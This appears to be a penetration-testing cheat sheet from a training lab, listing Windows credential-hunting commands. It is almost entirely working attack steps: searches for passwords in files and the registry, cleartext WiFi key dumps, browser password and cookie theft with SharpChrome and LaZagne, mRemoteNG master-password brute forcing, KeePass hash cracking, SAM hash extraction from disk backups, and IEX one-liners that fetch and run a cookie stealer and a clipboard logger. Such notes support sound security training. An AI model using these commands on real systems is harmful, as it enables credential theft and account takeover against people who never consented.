# Windows Credential Hunting

## Application Config Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

## Chrome Dictionary Files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## Unattended Installation Files
- Check `unattend.xml`, `sysprep.xml`, `sysprep.inf` for plaintext or base64 passwords
- Common locations: `C:\Windows\Panther\`, `C:\Windows\System32\Sysprep\`

## PowerShell History
```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
```
```powershell
# Read all users' PS history
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## PowerShell Credentials (DPAPI)
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

## Cmdkey Saved Credentials
```cmd
cmdkey /list
```
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Browser Credentials (SharpChrome)
```powershell
.\SharpChrome.exe logins /unprotect
```

## KeePass Database Cracking
```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

## Sticky Notes
- DB location: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
```powershell
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```
```bash
strings plum.sqlite-wal
```

## Windows AutoLogon (Registry)
```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
- Look for `DefaultUserName` and `DefaultPassword`

## PuTTY Saved Sessions (Registry)
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION_NAME>
```
- Look for `ProxyUsername` and `ProxyPassword`

## WiFi Passwords
```cmd
netsh wlan show profile
netsh wlan show profile ilfreight_corp key=clear
```
- Look for `Key Content` field

## LaZagne (All-in-One Credential Recovery)
```powershell
.\lazagne.exe all
```
- Modules: browsers, chats, databases, games, git, mails, memory, multimedia, php, svn, sysadmin, wifi, windows

## SessionGopher
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```
- Extracts saved PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP credentials

## File System Credential Search
```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config
```
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

## Other Interesting Files
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

## mRemoteNG Stored Credentials
- Config file: `%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml`
- Default master password is `mR3m` if user didn't set a custom one
- Passwords encrypted in the `Password` attribute of `Node` elements
```bash
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR..."
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8Kn..." -p admin
```
```bash
# Brute force master password
for password in $(cat /usr/share/wordlists/fasttrack.txt); do echo $password; python3 mremoteng_decrypt.py -s "ENCRYPTED_STRING" -p $password 2>/dev/null; done
```

## Cookie Stealing (Slack, IM Clients)

### Firefox Cookies
```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
```bash
python3 cookieextractor.py --dbpath "/home/user/cookies.sqlite" --host slack --cookie d
```

### Chromium-based Browser Cookies
```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

## Clipboard Monitoring
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

## Installed Programs Enumeration
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

## Mounting VHDX/VMDK Backups
- Look for `.vhd`, `.vhdx`, `.vmdk` files on shares or locally
- Extract SAM/SYSTEM/SECURITY hives for local hash dumping

### Linux
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```
### Extract Hashes from Mounted Disk
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## Restic Backup Abuse
```powershell
restic.exe -r E:\restic2\ snapshots
restic.exe -r E:\restic2\ restore <SNAPSHOT_ID> --target C:\Restore
```
